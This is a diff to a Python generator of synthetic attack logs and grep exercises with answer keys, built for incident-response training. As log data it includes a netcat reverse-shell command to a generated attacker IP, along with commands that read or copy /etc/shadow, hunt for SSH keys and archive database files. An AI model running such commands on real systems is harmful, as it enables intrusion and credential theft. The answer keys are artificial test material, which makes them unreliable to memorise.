@@ -11,9 +11,21 @@ archetype's questions get included (decoys are planted but their questions dropp
 """
 import re
 from datetime import timedelta
-from .pool import (rand_internal_ip, rand_hex, SQLI_PAYLOADS,
-                    TRAVERSAL_PAYLOADS, WEBSHELL_PATHS, SUDO_COMMANDS_ABUSE, EXFIL_PATHS, UA_TOOLING)
-from .logfmt import auth_line, access_line, iptables_line, dns_line, exec_line, syslog_ts
+from .pool import (rand_hex, SQLI_PAYLOADS,
+                    TRAVERSAL_PAYLOADS, WEBSHELL_PATHS, SUDO_COMMANDS_ABUSE, UA_TOOLING,
+                    PHISHING_LURES, LOLBIN_COMMANDS)
+from .logfmt import auth_line, access_line, iptables_line, dns_line, exec_line, endpoint_line, syslog_ts
+
+
+def _sq(s):
+    """POSIX single-quote-escape a string for embedding in an f-string `cmd` that's
+    itself wrapped in single quotes. Needed for any interpolated value that isn't
+    guaranteed quote-free by construction (IPs/hostnames/usernames we generate never
+    contain one, but a couple of SUDO_COMMANDS_ABUSE entries do, e.g. the vim/python
+    sudo-escape one-liners that legitimately contain '/bin/sh') -- without this, an
+    embedded quote silently breaks the shell quoting and the documented cmd stops
+    matching anything at all."""
+    return "'" + s.replace("'", "'\\''") + "'"
 
 
 def _burst(ctx, start, count, lo, hi):
@@ -148,11 +160,15 @@ def plant_credential_stuffing(ctx, used):
              cmd=f"grep -F 'POST /login' access.log | grep -F '{ua}' | awk '{{print $1}}' | sort -u | wc -l",
              explain="-F is used twice because both the path and the User-Agent string contain '/' and '.' which grep would otherwise treat as regex metacharacters.",
              skills=["-F", "pipeline"]),
-        dict(q="Which single IP eventually got a 200 response on /login during the credential-stuffing wave?",
+        dict(q="Among that credential-stuffing wave specifically, which single IP eventually got a 200 "
+               "response on /login? (Ordinary legitimate traffic gets 200 on /login constantly, so "
+               "filtering on status alone won't isolate it -- narrow to the wave's traffic first.)",
              a=success_ip,
-             cmd="grep -F 'POST /login' access.log | grep -w 200",
-             explain="-w matches '200' as a whole word/field so it doesn't also match sizes or timestamps that merely contain the digits 200.",
-             skills=["-w", "pipeline"]),
+             cmd=f"grep -F 'POST /login' access.log | grep -F '{ua}' | grep -w 200",
+             explain="Filtering to the credential-stuffing wave's own User-Agent first (as in the previous "
+                     "question) excludes ordinary successful logins, which also return 200 on /login and "
+                     "would otherwise swamp a plain status-code filter; -w then isolates the 200 status field.",
+             skills=["-F", "-w", "pipeline"]),
     ]
     return dict(key="credential_stuffing", title="Credential stuffing",
                 briefing="A wave of automated login POSTs hit the /login endpoint from many different IPs.",
@@ -174,9 +190,19 @@ def plant_web_shell_upload(ctx, used):
         t = upload_t + timedelta(seconds=rng.randint(30, 6000) * (i + 1) // max(n_access, 1) + rng.randint(1, 30))
         events_access.append((t, access_line(t, attacker, "GET", shell_path + "?cmd=whoami", "HTTP/1.1", 200, rng.randint(20, 300), "-", rng.choice(UA_TOOLING))))
     reverse_port = rng.randint(4000, 9999)
+    reverse_t = upload_t + timedelta(seconds=45)
     exec_events = [
-        (upload_t + timedelta(seconds=45), exec_line(upload_t + timedelta(seconds=45), host, 33, "www-data",
+        (reverse_t, exec_line(reverse_t, host, 33, "www-data",
          "/bin/sh", f"/bin/sh -c nc -e /bin/sh {attacker} {reverse_port}", rng.randint(1000, 32000)))
+    ]
+    # the actual network callback the exec.log command triggered -- a separate, independent
+    # log source that either confirms or contradicts what exec.log claims happened
+    host_ip = ctx.host_ips[host]
+    firewall_events = [
+        (reverse_t + timedelta(seconds=1), iptables_line(
+            reverse_t + timedelta(seconds=1), ctx.primary_fw, "ACCEPT", "eth0", "eth0",
+            ":".join(f"{rng.randint(0,255):02x}" for _ in range(6)), host_ip, attacker, "TCP",
+            rng.randint(1024, 65000), reverse_port, "SYN", rng.randint(10000, 99999)))
     ]
     facts = dict(attacker=attacker, shell_path=shell_path, upload_t=upload_t, reverse_port=reverse_port, host=host)
     questions = [
@@ -192,10 +218,20 @@ def plant_web_shell_upload(ctx, used):
              explain="\\K (not a lookbehind) drops everything matched so far, including the variable-length "
                      "attacker IP -- a true lookbehind here would fail since PCRE lookbehind must be fixed-length.",
              skills=["-P", "-o"]),
+        dict(q=f"exec.log shows the shell process *attempting* that callback -- it doesn't prove the network "
+               f"connection actually happened. Corroborate it in firewall.log: what destination port does "
+               f"`{host}` actually show an outbound connection to, and does it match the port from exec.log?",
+             a=str(reverse_port),
+             cmd=f"grep -F -w '{host_ip}' firewall.log | grep -F -w '{attacker}' | grep -oP 'DPT=\\K\\d+'",
+             explain="exec.log only proves a process ran a command; firewall.log independently proves a packet "
+                     "actually left the host. Matching the port in both is what turns 'the process tried to' "
+                     "into 'the connection succeeded'.",
+             skills=["-F", "-o", "-w", "pipeline"]),
     ]
     return dict(key="web_shell_upload", title="Web shell upload",
                 briefing=f"An upload endpoint on `{host}` was abused to plant a persistent web shell.",
-                events={"access": events_access, "exec": exec_events}, facts=facts, questions=questions)
+                events={"access": events_access, "exec": exec_events, "firewall": firewall_events},
+                facts=facts, questions=questions)
 
 
 # ---------------------------------------------------------------- 5. SQL injection probing
@@ -248,7 +284,13 @@ def plant_directory_traversal(ctx, used):
         status = 200 if is_success else rng.choice([400, 403, 404])
         if is_success:
             success_t = t
-        events.append((t, access_line(t, attacker, "GET", payload, "HTTP/1.1", status, rng.randint(100, 2200), "-", rng.choice(UA_TOOLING))))
+        # size is never exactly 200 -- Q2 below greps for the status code 200 as a
+        # whole word, and a byte-size that happened to land on 200 would make that
+        # match a second (wrong) line too.
+        size = rng.randint(100, 2200)
+        if size == 200:
+            size += 1
+        events.append((t, access_line(t, attacker, "GET", payload, "HTTP/1.1", status, size, "-", rng.choice(UA_TOOLING))))
     facts = dict(attacker=attacker, n=n, success_t=success_t)
     questions = [
         dict(q="Directory traversal payloads (../.. and URL-encoded variants) were attempted against the "
@@ -271,7 +313,7 @@ def plant_directory_traversal(ctx, used):
 # ---------------------------------------------------------------- 7. DNS tunneling
 def plant_dns_tunneling(ctx, used):
     rng = ctx.rng
-    client = rand_internal_ip(rng, ctx.internal_octet)
+    client = ctx.unique_internal_ip()
     tunnel_domain = f"{rng.choice(['sync', 'relay', 'cdn-edge', 'update'])}-{rand_hex(rng, 4)}.{rng.choice(['datastream-info.net', 'cloud-mirror.io', 'edge-relay.co'])}"
     start = ctx.random_ts()
     n = rng.randint(150, 500)
@@ -309,7 +351,7 @@ def plant_dns_tunneling(ctx, used):
 # ---------------------------------------------------------------- 8. DGA beaconing
 def plant_dga_beaconing(ctx, used):
     rng = ctx.rng
-    client = rand_internal_ip(rng, ctx.internal_octet)
+    client = ctx.unique_internal_ip()
     tld = rng.choice(["top", "xyz", "info"])
     start = ctx.random_ts()
     n = rng.randint(60, 180)
@@ -343,20 +385,41 @@ def plant_dga_beaconing(ctx, used):
 # ---------------------------------------------------------------- 9. C2 beaconing at regular interval
 def plant_c2_beaconing(ctx, used):
     rng = ctx.rng
-    infected = rand_internal_ip(rng, ctx.internal_octet)
+    infected = ctx.unique_internal_ip()
     c2_ip = _new_ip(ctx, used)
+    c2_domain = (f"{rng.choice(['cdn-sync', 'static-assets', 'edge-metrics', 'api-telemetry'])}-"
+                 f"{rand_hex(rng, 3)}.{rng.choice(['datastream-info.net', 'cloud-mirror.io', 'edge-relay.co'])}")
     interval = rng.choice([30, 60, 90, 120, 300])
-    start = ctx.random_ts()
     n = rng.randint(80, 200)
+    # the answer-key command diffs consecutive timestamps using day-of-month (no year in
+    # these logs), which breaks across a calendar month boundary (day resets from e.g. 31
+    # to 1) -- reroll the start time until the whole beacon span fits inside one month
+    for _ in range(50):
+        start = ctx.random_ts()
+        end_t = start + timedelta(seconds=(n - 1) * interval)
+        if (start.year, start.month) == (end_t.year, end_t.month):
+            break
     events = []
     dport = rng.choice([443, 8443, 4444])
+
+    # a handful of DNS lookups for the C2 domain just before the beacon starts -- the
+    # "server" slot of dns_line normally carries the resolving server's own address, but
+    # here it's repurposed to carry the ANSWER the resolver returned, so the domain can be
+    # tied to c2_ip independently of the firewall log (see Q4 below).
+    dns_events = []
+    n_lookups = rng.randint(2, 5)
+    for i in range(n_lookups):
+        t = start - timedelta(seconds=(n_lookups - i) * rng.randint(20, 90))
+        dns_events.append((t, dns_line(t, ctx.primary_dns, infected, rng.randint(1024, 65000),
+                                        c2_domain, "A", c2_ip)))
+
     for i in range(n):
         t = start + timedelta(seconds=i * interval)
         ident = rng.randint(10000, 99999)
         mac = ":".join(f"{rng.randint(0,255):02x}" for _ in range(6))
         events.append((t, iptables_line(t, ctx.primary_fw, "ACCEPT", "eth0", "eth0", mac, infected, c2_ip, "TCP",
                                          rng.randint(1024, 65000), dport, "SYN", ident)))
-    facts = dict(infected=infected, c2_ip=c2_ip, interval=interval, n=n)
+    facts = dict(infected=infected, c2_ip=c2_ip, c2_domain=c2_domain, interval=interval, n=n)
     questions = [
         dict(q=f"An internal host is repeatedly connecting out to a single external IP at what looks like a "
                "fixed interval -- classic C2 beaconing. What is that external IP?",
@@ -376,17 +439,27 @@ def plant_c2_beaconing(ctx, used):
              cmd=f"grep -c -F -w '{c2_ip}' firewall.log",
              explain="-F -c counts literal matches of the IP without dots being treated as regex wildcards.",
              skills=["-F", "-c"]),
+        dict(q="Corroborate the beacon with a second, independent source: just before the beaconing started, "
+               "what domain did the infected host resolve in dns.log -- and does the IP it resolved to match "
+               "the beacon destination you found in firewall.log? (Don't just trust one log file; confirm the "
+               "same C2 infrastructure shows up in both.)",
+             a=c2_domain,
+             cmd=f"grep -F -w '{infected}' dns.log",
+             explain="Two unrelated log sources (DNS resolution and firewall connections) independently pointing "
+                     "at the same infrastructure is much stronger evidence than either alone -- this is the "
+                     "corroboration step a real investigation can't skip before calling something confirmed C2.",
+             skills=["-F", "pipeline"]),
     ]
     return dict(key="c2_beaconing", title="C2 beaconing",
                 briefing="An internal host shows a suspiciously periodic pattern of outbound connections.",
-                events={"firewall": events}, facts=facts, questions=questions)
+                events={"firewall": events, "dns": dns_events}, facts=facts, questions=questions)
 
 
 # ---------------------------------------------------------------- 10. Data exfiltration via large responses
 def plant_data_exfil(ctx, used):
     rng = ctx.rng
-    exfil_ip = rand_internal_ip(rng, ctx.internal_octet) if rng.random() < 0.5 else _new_ip(ctx, used)
-    path = rng.choice(EXFIL_PATHS)
+    exfil_ip = ctx.unique_internal_ip() if rng.random() < 0.5 else _new_ip(ctx, used)
+    path = ctx.pick_exfil_path()
     start = ctx.random_ts().replace(hour=rng.choice([1, 2, 3, 23]))
     events = []
     n = rng.randint(3, 7)
@@ -432,8 +505,9 @@ def plant_priv_esc(ctx, used):
     abuse_cmd = rng.choice(SUDO_COMMANDS_ABUSE)
     t = start + timedelta(seconds=n_wrong * 20 + 15)
     events_auth.append((t, auth_line(t, host, "sudo", rng.randint(1000, 32000), f"{user} : TTY=pts/1 ; PWD=/home/{user} ; USER=root ; COMMAND={abuse_cmd}")))
-    exec_events = [(t + timedelta(seconds=2), exec_line(t + timedelta(seconds=2), host, 0, "root", "/bin/bash", abuse_cmd, rng.randint(1000, 32000)))]
-    facts = dict(user=user, host=host, abuse_cmd=abuse_cmd, n_wrong=n_wrong, ts=t)
+    exec_pid = rng.randint(1000, 32000)
+    exec_events = [(t + timedelta(seconds=2), exec_line(t + timedelta(seconds=2), host, 0, "root", "/bin/bash", abuse_cmd, exec_pid))]
+    facts = dict(user=user, host=host, abuse_cmd=abuse_cmd, n_wrong=n_wrong, ts=t, exec_pid=exec_pid)
     questions = [
         dict(q=f"A user on `{host}` mistyped their sudo password a few times before running a suspicious "
                "privileged command. Which user was it?",
@@ -446,6 +520,14 @@ def plant_priv_esc(ctx, used):
              cmd=f"grep -F -w '{user}' auth.log | grep -F 'USER=root' | tail -1",
              explain="-F is needed because the command line itself may contain parentheses/quotes that are regex metacharacters.",
              skills=["-F", "pipeline"]),
+        dict(q="auth.log only proves sudo *granted* that command -- it doesn't prove the command actually ran. "
+               "Corroborate it in exec.log: what PID did that command execute under?",
+             a=str(exec_pid),
+             cmd=f"grep -F -w '{host}' exec.log | grep -F {_sq(abuse_cmd)}",
+             explain="A grant in auth.log and an EXECVE record in exec.log are two independent subsystems "
+                     "logging the same moment -- finding the matching PID in exec.log is what confirms the "
+                     "privileged command didn't just get approved, it ran.",
+             skills=["-F", "-w", "pipeline"]),
     ]
     return dict(key="priv_esc_sudo", title="Privilege escalation via sudo abuse",
                 briefing=f"A sudo session on `{host}` shows failed attempts followed by a high-risk command.",
@@ -460,10 +542,27 @@ def plant_lateral_movement(ctx, used):
     targets = rng.sample(ctx.hosts["db"] + ctx.hosts["app"], k=min(3, len(ctx.hosts["db"] + ctx.hosts["app"])))
     start = ctx.random_ts()
     events = []
+    firewall_events = []
     for i, host in enumerate(targets):
         t = start + timedelta(minutes=i * rng.randint(2, 6))
         events.append((t, auth_line(t, host, "sshd", rng.randint(1000, 32000), f"Accepted password for {user} from {pivot_ip} port {rng.randint(30000,60000)} ssh2")))
-    facts = dict(user=user, pivot_ip=pivot_ip, targets=targets)
+        # the network-layer connection backing that login -- an independent source that
+        # either confirms or contradicts what the auth.log entry alone claims
+        conn_t = t - timedelta(seconds=rng.randint(1, 3))
+        firewall_events.append((conn_t, iptables_line(
+            conn_t, ctx.primary_fw, "ACCEPT", "eth0", "eth0",
+            ":".join(f"{rng.randint(0,255):02x}" for _ in range(6)), pivot_ip, ctx.host_ips[host], "TCP",
+            rng.randint(1024, 65000), 22, "SYN", rng.randint(10000, 99999))))
+    # deeper analysis: what actually fired off those SSH sessions on the origin
+    # workstation, rather than a human typing each login by hand
+    workstation = ctx.user_workstation[user]
+    script_t = start - timedelta(seconds=rng.randint(30, 120))
+    script_cmd = ("powershell.exe -Command \"foreach($h in @('" + "','".join(targets) +
+                  "')){ssh " + user + "@$h whoami}\"")
+    endpoint_events = [(script_t, endpoint_line(script_t, workstation, user, rng.randint(9001, 32000),
+                        rng.randint(1000, 9000), "powershell.exe", "explorer.exe", script_cmd))]
+
+    facts = dict(user=user, pivot_ip=pivot_ip, targets=targets, workstation=workstation)
     questions = [
         dict(q=f"After an initial compromise, account `{user}` was seen SSHing into several internal hosts "
                "in quick succession. Into how many distinct hosts did it successfully log in?",
@@ -476,10 +575,30 @@ def plant_lateral_movement(ctx, used):
              cmd=f"grep -F -w '{user}' auth.log | grep 'Accepted password' | grep -oP '(?<=from )\\S+'",
              explain="A lookbehind for 'from ' lets -o print just the source IP token that follows it.",
              skills=["-P", "-o"]),
+        dict(q="auth.log alone only proves an application-level login was accepted -- it doesn't prove a real "
+               "network connection carried it. Corroborate independently in firewall.log: how many distinct "
+               "internal destination IPs received an ACCEPTed port-22 connection from that same source IP?",
+             a=str(len(targets)),
+             cmd=f"grep -F -w '{pivot_ip}' firewall.log | grep -F 'DPT=22' | grep -oP 'DST=\\K\\S+' | sort -u | wc -l",
+             explain="Getting the same count of distinct hosts from firewall.log's connection records as from "
+                     "auth.log's login records -- two unrelated logging subsystems -- is what makes the finding "
+                     "solid instead of resting on a single log source.",
+             skills=["-F", "-o", "pipeline"]),
+        dict(q="One more source to check on the ORIGIN workstation itself: what process in endpoint.log fired "
+               "off all those SSH sessions in one shot -- a strong sign this was scripted, not a human typing "
+               "each login by hand?",
+             a="powershell.exe",
+             cmd=f"grep -F -w '{workstation}' endpoint.log | grep -F 'ssh'",
+             explain="A single process launching all the connections back-to-back (instead of several separate "
+                     "interactive terminal sessions) is exactly the kind of detail endpoint.log surfaces that "
+                     "auth.log and firewall.log alone can't -- it points at automation, not a person driving "
+                     "each hop by hand.",
+             skills=["-F", "-w"]),
     ]
     return dict(key="lateral_movement", title="Lateral movement",
                 briefing=f"Account `{user}` authenticated into multiple internal hosts in a short window.",
-                events={"auth": events}, facts=facts, questions=questions)
+                events={"auth": events, "firewall": firewall_events, "endpoint": endpoint_events},
+                facts=facts, questions=questions)
 
 
 # ---------------------------------------------------------------- 13. Insider after-hours access
@@ -487,7 +606,7 @@ def plant_insider_access(ctx, used):
     rng = ctx.rng
     user = ctx.pick_protagonist_user()
     ip = ctx.user_ips[user]
-    path = rng.choice(EXFIL_PATHS)
+    path = ctx.pick_exfil_path()
     nights = rng.randint(3, 6)
     lookback_days = 14
     chosen_days = rng.sample(range(lookback_days), k=min(nights, lookback_days))
@@ -503,8 +622,15 @@ def plant_insider_access(ctx, used):
     login_t = ctx.random_ts()
     auth_events.append((login_t, auth_line(login_t, ctx.primary_bastion, "sshd", rng.randint(1000, 32000),
                         f"Accepted password for {user} from {ip} port {rng.randint(30000,60000)} ssh2")))
+    # likewise, a routine daytime workstation event so endpoint.log's user->host mapping
+    # resolves once you know which employee this is -- the next real DFIR step is knowing
+    # which physical machine to go investigate
+    workstation = ctx.user_workstation[user]
+    wkstn_t = ctx.random_ts()
+    endpoint_events = [(wkstn_t, endpoint_line(wkstn_t, workstation, user, rng.randint(9001, 32000),
+                        rng.randint(1000, 9000), "outlook.exe", "explorer.exe", "outlook.exe /recycle"))]
     nights = len(chosen_days)
-    facts = dict(user=user, ip=ip, path=path, nights=nights)
+    facts = dict(user=user, ip=ip, path=path, nights=nights, workstation=workstation)
     questions = [
         dict(q=f"An internal account has been accessing `{path}` several times between 01:00-05:00 -- outside "
                "normal business hours. What internal IP is doing this?",
@@ -522,17 +648,27 @@ def plant_insider_access(ctx, used):
              cmd=f"grep -F '{path}' access.log | grep -F -w '{ip}' | grep -oP '(?<=\\[)\\d{{2}}/\\w{{3}}/\\d{{4}}' | sort -u | wc -l",
              explain="A lookbehind on the opening bracket extracts just the DD/Mon/YYYY date, and deduplicating counts distinct calendar nights.",
              skills=["-F", "-P", "pipeline"]),
+        dict(q="Now that you have the employee's identity, one more piece of corroboration before you escalate: "
+               "which physical workstation hostname is tied to that account in endpoint.log? (That's the "
+               "machine you'd actually go image if this gets escalated to a formal investigation.)",
+             a=workstation,
+             cmd=f"grep -F -w '{user}' endpoint.log | awk '{{print $4}}' | sort -u",
+             explain="endpoint.log is a third, independent source (neither web nor SSH logs) tying the same "
+                     "account to a specific physical asset -- the detail that turns 'we suspect this person' "
+                     "into 'we know which machine to seize.'",
+             skills=["-F", "pipeline"]),
     ]
     return dict(key="insider_after_hours", title="Insider after-hours access",
                 briefing="A legitimate account is repeatedly accessing sensitive data late at night.",
-                events={"access": events, "auth": auth_events}, facts=facts, questions=questions)
+                events={"access": events, "auth": auth_events, "endpoint": endpoint_events},
+                facts=facts, questions=questions)
 
 
 # ---------------------------------------------------------------- 14. Port scanning
 def plant_port_scan(ctx, used):
     rng = ctx.rng
     scanner = _new_ip(ctx, used)
-    target = rand_internal_ip(rng, ctx.internal_octet)
+    target = ctx.unique_internal_ip()
     ports = rng.sample(range(1, 65000), k=rng.randint(80, 250))
     start = ctx.random_ts()
     events = []
@@ -613,9 +749,211 @@ def plant_log_tampering(ctx, used):
                 events={"auth": events}, facts=facts, questions=questions)
 
 
+# ---------------------------------------------------------------- 16. Full compromise chain
+def plant_compromise_chain(ctx, used):
+    """A single actor followed across all three network-facing logs: brute-forces SSH
+    (auth.log), pivots deeper into the network using the compromised account (auth.log
+    again, from a different source), runs recon on the new host (exec.log), then that
+    same host beacons back out to the ORIGINAL attacker IP (firewall.log). No single
+    question here is answerable from one log file in isolation the way most archetypes'
+    questions are -- each step's finding has to be carried into the next log to either
+    confirm or extend the story, which is closer to how a real multi-stage incident gets
+    reconstructed than any single-log grep exercise.
+    """
+    rng = ctx.rng
+    attacker = _new_ip(ctx, used)
+    target_user = ctx.pick_protagonist_user()
+    host = ctx.primary_bastion
+    fail_count = rng.randint(30, 90)
+    start = ctx.random_ts()
+    times = _burst(ctx, start, fail_count, 2, 9)
+    events_auth = []
+    for t in times:
+        pid = rng.randint(1000, 32000)
+        port = rng.randint(30000, 60000)
+        events_auth.append((t, auth_line(t, host, "sshd", pid,
+                            f"Failed password for {target_user} from {attacker} port {port} ssh2")))
+    success_t = times[-1] + timedelta(seconds=rng.randint(2, 8))
+    success_pid = rng.randint(1000, 32000)
+    events_auth.append((success_t, auth_line(success_t, host, "sshd", success_pid,
+                        f"Accepted password for {target_user} from {attacker} port {rng.randint(30000,60000)} ssh2")))
+    events_auth.append((success_t, auth_line(success_t, host, "sshd", success_pid,
+                        f"pam_unix(sshd:session): session opened for user {target_user}(uid=1010) by (uid=0)")))
+
+    # phase 2: pivot deeper using the same compromised account, now sourced from the
+    # bastion's OWN address -- the attacker is operating from inside the network
+    bastion_ip = ctx.host_ips[host]
+    pivot_target = rng.choice(ctx.hosts["db"] + ctx.hosts["app"])
+    pivot_t = success_t + timedelta(minutes=rng.randint(2, 12))
+    events_auth.append((pivot_t, auth_line(pivot_t, pivot_target, "sshd", rng.randint(1000, 32000),
+                        f"Accepted password for {target_user} from {bastion_ip} port {rng.randint(30000,60000)} ssh2")))
+
+    # phase 3: recon on the newly reached host
+    recon_cmd = rng.choice(["cat /etc/passwd", "find / -name id_rsa 2>/dev/null",
+                             "tar -czf /tmp/.cache.tar.gz /var/lib/postgresql/data", "cat /etc/shadow",
+                             "cp /etc/shadow /tmp/.s"])
+    recon_t = pivot_t + timedelta(seconds=rng.randint(15, 90))
+    events_exec = [(recon_t, exec_line(recon_t, pivot_target, 1010, target_user, "/bin/bash",
+                    recon_cmd, rng.randint(1000, 32000)))]
+
+    # phase 4: the pivot host beacons back out to the SAME external IP that ran the
+    # original brute force -- independent (firewall.log) proof the two phases are the
+    # same actor, not two unrelated incidents that happen to share a compromised account
+    pivot_ip = ctx.host_ips[pivot_target]
+    interval = rng.choice([60, 120, 300])
+    n_beacon = rng.randint(15, 40)
+    beacon_start = recon_t + timedelta(minutes=rng.randint(1, 5))
+    events_firewall = []
+    for i in range(n_beacon):
+        t = beacon_start + timedelta(seconds=i * interval)
+        events_firewall.append((t, iptables_line(
+            t, ctx.primary_fw, "ACCEPT", "eth0", "eth0",
+            ":".join(f"{rng.randint(0,255):02x}" for _ in range(6)), pivot_ip, attacker, "TCP",
+            rng.randint(1024, 65000), rng.choice([443, 8443]), "SYN", rng.randint(10000, 99999))))
+
+    facts = dict(attacker=attacker, target_user=target_user, host=host, pivot_target=pivot_target,
+                 recon_cmd=recon_cmd, n_beacon=n_beacon, pivot_ip=pivot_ip)
+    questions = [
+        dict(q=f"An account (`{target_user}`) on `{host}` was hit with repeated failed SSH logins before "
+               "finally succeeding. What IP was responsible?",
+             a=attacker,
+             cmd=f"grep -F -w '{target_user}' auth.log | grep 'Failed password' | grep -oP '(?<=from )\\S+' | sort -u",
+             explain="Scoping to the targeted username first (rather than ranking every failed IP in the whole "
+                     "file) avoids picking up an unrelated brute-force IP if more than one is running this scenario.",
+             skills=["-F", "-P", "-o", "pipeline"]),
+        dict(q=f"After that login succeeded, `{target_user}`'s credentials were used again from an internal "
+               "IP to reach a second host -- the attacker pivoting deeper using the account they just "
+               "compromised. Which host did they land on?",
+             a=pivot_target,
+             cmd=f"grep -F -w '{target_user}' auth.log | grep 'Accepted password' | tail -1 | awk '{{print $4}}'",
+             explain="This account has exactly two successful logins in the log: the original compromise and "
+                     "the pivot. Since auth.log is chronological, tail -1 grabs the later (pivot) one, and "
+                     "field 4 of the syslog format is the hostname it landed on.",
+             skills=["-F", "pipeline"]),
+        dict(q=f"Once on `{pivot_target}`, corroborate what the attacker did there using exec.log -- what "
+               "command did the compromised account run?",
+             a=recon_cmd,
+             cmd=f"grep -F -w '{pivot_target}' exec.log | grep -F -w '{target_user}'",
+             explain="auth.log only proves a login happened; exec.log is an independent record of what actually "
+                     "ran afterward -- without it you'd know someone got in, but not what they did next.",
+             skills=["-F", "-w", "pipeline"]),
+        dict(q="Final corroboration: does the pivot host show any outbound activity tying it back to the "
+               "*original* attacker IP from question 1, confirming this is one continuous incident rather than "
+               "two unrelated ones? Cross-reference firewall.log for the pivot host's IP -- what external IP "
+               "does it keep connecting out to?",
+             a=attacker,
+             cmd=f"grep -F -w '{pivot_ip}' firewall.log | grep ACCEPT | grep -oP 'DST=\\K\\S+' | sort | uniq -c | sort -rn | head -1",
+             explain="Tying the beacon destination back to the SAME IP identified in question 1 -- via a "
+                     "completely different log file -- is what upgrades 'these might be related' to 'this is "
+                     "confirmed to be one actor across the whole kill chain'.",
+             skills=["-F", "-P", "-o", "pipeline"]),
+    ]
+    return dict(key="compromise_chain", title="Full compromise chain (brute force -> pivot -> recon -> C2)",
+                briefing=f"`{host}` took repeated failed SSH logins that eventually succeeded, and the "
+                         "compromised account was seen authenticating elsewhere shortly after.",
+                events={"auth": events_auth, "exec": events_exec, "firewall": events_firewall},
+                facts=facts, questions=questions)
+
+
+# ---------------------------------------------------------------- 17. Workstation phishing/malware chain
+def plant_workstation_malware(ctx, used):
+    """A phishing lure gets opened on an employee workstation, spawns a living-off-the-land
+    binary, and the workstation calls out to C2 -- followed across endpoint.log (which
+    requires walking a process tree: matching a child process by its PARENT field, not
+    just spotting one suspicious event), dns.log, and firewall.log.
+    """
+    rng = ctx.rng
+    user = ctx.pick_protagonist_user()
+    workstation = ctx.user_workstation[user]
+    ip = ctx.user_ips[user]
+    c2_ip = _new_ip(ctx, used)
+    lure = rng.choice(PHISHING_LURES)
+    lolbin_image, lolbin_cmd = rng.choice(LOLBIN_COMMANDS)
+
+    start = ctx.random_ts()
+    opener = rng.choice(["outlook.exe", "chrome.exe"])
+    open_pid = rng.randint(9001, 32000)
+    open_ppid = rng.randint(1000, 9000)
+    events_endpoint = [
+        (start, endpoint_line(start, workstation, user, open_pid, open_ppid, lure, opener,
+                               f"\"C:\\Users\\{user}\\Downloads\\{lure}\""))
+    ]
+    # the LOLBin's parent is the lure's OWN image -- that's what lets a question walk the
+    # tree (lure -> LOLBin) instead of just grepping for a suspicious binary directly
+    lolbin_t = start + timedelta(seconds=rng.randint(2, 15))
+    lolbin_pid = rng.randint(9001, 32000)
+    events_endpoint.append((lolbin_t, endpoint_line(lolbin_t, workstation, user, lolbin_pid, open_pid,
+                            lolbin_image, lure, lolbin_cmd)))
+
+    # DNS resolution for the C2 domain -- resolved to c2_ip (see c2_beaconing for why the
+    # dns_line "server" slot is repurposed here to carry the real answer)
+    c2_domain = (f"{rng.choice(['secure-update', 'ms-telemetry', 'cdn-static', 'account-verify'])}-"
+                 f"{rand_hex(rng, 3)}.{rng.choice(['datastream-info.net', 'cloud-mirror.io', 'edge-relay.co'])}")
+    dns_t = lolbin_t + timedelta(seconds=rng.randint(1, 10))
+    events_dns = [(dns_t, dns_line(dns_t, ctx.primary_dns, ip, rng.randint(1024, 65000), c2_domain, "A", c2_ip))]
+
+    conn_t = dns_t + timedelta(seconds=rng.randint(1, 5))
+    events_firewall = [(conn_t, iptables_line(
+        conn_t, ctx.primary_fw, "ACCEPT", "eth0", "eth0",
+        ":".join(f"{rng.randint(0,255):02x}" for _ in range(6)), ip, c2_ip, "TCP",
+        rng.randint(1024, 65000), rng.choice([443, 8443]), "SYN", rng.randint(10000, 99999)))]
+
+    facts = dict(user=user, workstation=workstation, ip=ip, infected=ip, lure=lure,
+                 lolbin_image=lolbin_image, c2_domain=c2_domain, c2_ip=c2_ip)
+    questions = [
+        dict(q="An employee workstation's endpoint.log shows a process launched with a double file "
+               "extension (e.g. ending in `.pdf.exe` or `.doc.exe`) -- a classic phishing lure disguise. "
+               "What is the exact filename?",
+             a=lure,
+             cmd=r"grep -oP 'image=\"\K[^\"]*\.\w+\.exe(?=\")' endpoint.log | sort -u",
+             explain="The lookahead stops the match right before the closing quote so -o prints just the "
+                     "filename; requiring a SECOND extension before .exe is what singles out the disguised "
+                     "lure from ordinary single-extension launches like chrome.exe.",
+             skills=["-P", "-o", "pipeline"]),
+        dict(q="Which workstation is this happening on, and which user account is it?",
+             a=f"{workstation} ({user})",
+             cmd=f"grep -F '{lure}' endpoint.log",
+             explain="endpoint.log's host and user= fields on that same line identify both the machine and "
+                     "the account without needing a second lookup.",
+             skills=["-F"]),
+        dict(q="The lure then spawned a second process -- a living-off-the-land binary, a common way to "
+               "blend malicious execution into legitimate system tools. Walk the process tree in endpoint.log: "
+               "what process did the lure spawn?",
+             a=lolbin_image,
+             cmd=f"grep -F 'parent=\"{lure}\"' endpoint.log | grep -oP 'image=\"\\K[^\"]+'",
+             explain="Filtering on parent=\"<lure>\" finds the child process the lure itself launched -- "
+                     "reading a process tree means matching on the PARENT field, not just searching for "
+                     "suspicious images directly.",
+             skills=["-F", "-o", "pipeline"]),
+        dict(q="Corroborate in dns.log: just before the workstation's outbound connection, what domain did "
+               "it resolve?",
+             a=c2_domain,
+             cmd=f"grep -F -w '{ip}' dns.log",
+             explain="A resolution immediately preceding an outbound connection to the same answer IP is "
+                     "what turns 'this workstation made a connection' into 'this workstation reached out to "
+                     "infrastructure it just looked up' -- consistent with malware-driven C2, not routine browsing.",
+             skills=["-F", "-w"]),
+        dict(q="Final corroboration in firewall.log: what external IP did the workstation actually connect "
+               "out to?",
+             a=c2_ip,
+             cmd=f"grep -F -w '{ip}' firewall.log | grep ACCEPT | grep -oP 'DST=\\K\\S+'",
+             explain="Three independent logs -- endpoint.log's process tree, dns.log's resolution, and "
+                     "firewall.log's connection -- all agreeing on the same machine and the same "
+                     "infrastructure is what makes this a confirmed compromise instead of three separate, "
+                     "maybe-unrelated observations.",
+             skills=["-F", "-w", "-o", "pipeline"]),
+    ]
+    return dict(key="workstation_malware", title="Workstation phishing/malware chain",
+                briefing=f"`{workstation}` shows a suspicious double-extension file execution followed by "
+                         "unusual outbound network activity.",
+                events={"endpoint": events_endpoint, "dns": events_dns, "firewall": events_firewall},
+                facts=facts, questions=questions)
+
+
 REGISTRY = [
     plant_ssh_bruteforce, plant_password_spraying, plant_credential_stuffing, plant_web_shell_upload,
     plant_sql_injection, plant_directory_traversal, plant_dns_tunneling, plant_dga_beaconing,
